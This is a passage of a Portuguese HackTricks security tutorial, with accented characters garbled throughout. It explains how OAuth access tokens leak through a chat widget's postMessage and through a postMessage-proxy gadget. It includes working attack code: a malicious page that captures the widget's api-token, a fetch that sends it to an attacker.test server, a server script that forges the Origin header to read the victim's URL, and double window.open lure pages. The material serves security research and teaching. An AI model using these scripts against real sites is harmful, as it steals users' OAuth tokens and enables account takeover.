1. Se um chat-api-token existir no localStorage do widget de chat, ele enviar√° o api-token para seu pai usando postMessage. Se nenhum chat-api-token existir, ele n√£o enviar√° nada.
2. Quando o iframe √© carregado, ele enviar√° uma mensagem postMessage com `{"type": "chat-widget", "key": "init"}` para seu pai.

Se voc√™ clicar no √≠cone de chat na janela principal:

1. Se nenhum chat-api-token tiver sido enviado ainda, o widget de chat criar√° um e o colocar√° no localStorage de sua pr√≥pria origem e o enviar√° por postMessage para a janela pai.
2. A janela pai far√° uma chamada de API para o servi√ßo de chat. O endpoint da API estava restrito pelo CORS ao site espec√≠fico configurado para o servi√ßo. Voc√™ precisava fornecer um cabe√ßalho `Origin` v√°lido para a chamada de API com o chat-api-token para permitir que a solicita√ß√£o fosse enviada.
3. A chamada de API da janela principal conteria `location.href` e o registraria como a "p√°gina atual" do visitante com o chat-api-token. A resposta ent√£o conteria tokens para se conectar a um websocket para iniciar a sess√£o de chat:

    ```json
    {
      "api_data": {
        "current_page": "https://example.com/#access_token=test",
        "socket_key": "xxxyyyzzz",
        ...
      }
    }
    ```

Neste exemplo, percebi que o an√∫ncio do chat-api-token sempre seria anunciado ao pai do iframe do widget de chat e, se eu obtivesse o chat-api-token, poderia fazer uma solicita√ß√£o do lado do servidor usando o token e, em seguida, adicionar meu pr√≥prio cabe√ßalho `Origin` artificial √† chamada de API, j√° que um cabe√ßalho CORS s√≥ importa para um navegador. Isso resultou na seguinte cadeia:

1. Criei uma p√°gina maliciosa que incorpora um iframe do widget de chat, adicionou um ouvinte de postMessage para ouvir o chat-api-token. Al√©m disso, acionei um evento para recarregar o iframe se eu n√£o tivesse recebido o api-token em 2 segundos. Isso foi para garantir que eu tamb√©m suportasse as v√≠timas que nunca iniciaram o chat e, como eu poderia acionar a abertura do chat remotamente, primeiro precisava do chat-api-token para come√ßar a pesquisar os dados no chat-API do lado do servidor.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
    <script>
    var gotToken = false;
    function reloadToCheck() {
      if (gotToken) return;
      setTimeout(function() {
        document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
      }, 2000);
    }
    window.onmessage = function(e) {
      if (e.data.key === 'api-token') {
        gotToken = true;
        lookInApi(e.data.value);    
      }
    }
    launchChatWindowByPostMessage();
    </script>
    ```
2. Adicionei um link √† p√°gina maliciosa para abrir o fluxo de login que acabaria na p√°gina com o widget de chat com o token na URL:

    ```
    <a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">Clique aqui para sequestrar o token</a>
    ```
3. A fun√ß√£o `launchChatWindowByPostMessage()` continuamente enviar√° uma mensagem postMessage para a janela principal, se aberta, para lan√ßar o widget de chat:

    ```javascript
    function launchChatWindowByPostMessage() {
      var launch = setInterval(function() {
        if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
      }, 500);
    }
    ```
4. Quando a v√≠tima clicou no link e acabou na p√°gina de erro, o chat seria iniciado e um chat-api-token seria criado. Minha recarga do iframe do widget de chat na p√°gina maliciosa obteria o `api-token` por meio de postMessage e eu poderia ent√£o come√ßar a procurar no API a URL atual da v√≠tima:

    ```javascript
    function lookInApi(token) {
      var look = setInterval(function() {
        fetch('https://fetch-server-side.attacker.test/?token=' + token).then(e => e.json()).then(e => {
          if (e &&
            e.api_data &&
            e.api_data.current_url &&
            e.api_data.current_url.indexOf('access_token') !== -1) {
              var payload = e.api_data.current_url
              document.getElementById('leak').innerHTML = 'Atacante agora tem o token: ' + payload;
              clearInterval(look);
          }
        });
      }, 2000);
    }
    ```
5. A p√°gina do lado do servidor em `https://fetch-server-side.attacker.test/?token=xxx` faria a chamada de API com o cabe√ßalho Origin adicionado para fazer o Chat-API pensar que eu estava usando-o como uma origem leg√≠tima:

    ```javascript
    addEventListener('fetch', event => {
      event.respondWith(handleRequest(event.request))
    })
    async function getDataFromChatApi(token) {
      return await fetch('https://chat-widget.example.com/api', {headers:{Origin: 'https://example.com', 'Chat-Api-Token': token}});
    }
    function handleRequest(request) {
      const token = request.url.match('token=([^&#]+)')[1] || null;
      return token ? getDataFromChatApi(token) : null;
    }
    ```
6. Quando a v√≠tima clicou no link e passou pela dan√ßa do OAuth e pousou na p√°gina de erro com o token adicionado, o widget de chat de repente apareceria, registraria a URL atual e o atacante teria o token de acesso da v√≠tima.

## Outras ideias para vazar URLs

Ainda existem diferentes tipos de gadgets esperando para serem encontrados. Aqui est√° um desses casos que n√£o consegui encontrar na natureza, mas poderia ser uma maneira potencial de obter a URL para vazar usando qualquer um dos modos de resposta dispon√≠veis.

### Uma p√°gina em um dom√≠nio que roteia qualquer postMessage para seu opener

Como todos os tipos de resposta `web_message` n√£o podem validar nenhum caminho da origem, qualquer URL em um dom√≠nio v√°lido pode receber a postMessage com o token. Se houver algum tipo de ouvinte de postMessage-proxy em uma das p√°ginas do dom√≠nio, que recebe qualquer mensagem enviada para ele e envia tudo para seu `opener`, posso fazer uma cadeia de window.open dupla:

P√°gina do atacante 1:
```html
<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
```
P√°gina do Atacante 2:
```html
<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
```
E o `https://example.com/postmessage-proxy` teria algo parecido com:
```javascript
// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```
Eu poderia usar qualquer um dos modos de resposta `web_message` para enviar o token do provedor OAuth para a origem v√°lida `https://example.com`, mas o endpoint enviaria o token para `opener`, que √© a p√°gina do atacante.

Esse fluxo pode parecer improv√°vel e requer dois cliques: um para criar um relacionamento de abertura entre o atacante e o site e o segundo para iniciar o fluxo OAuth tendo o site leg√≠timo como o abridor do pop-up OAuth.

O provedor OAuth envia o token para a origem leg√≠tima:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example1.png)

E a origem leg√≠tima tem o proxy postMessage para seu abridor:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example2.png)

O que faz com que o atacante obtenha o token:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example3.png)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
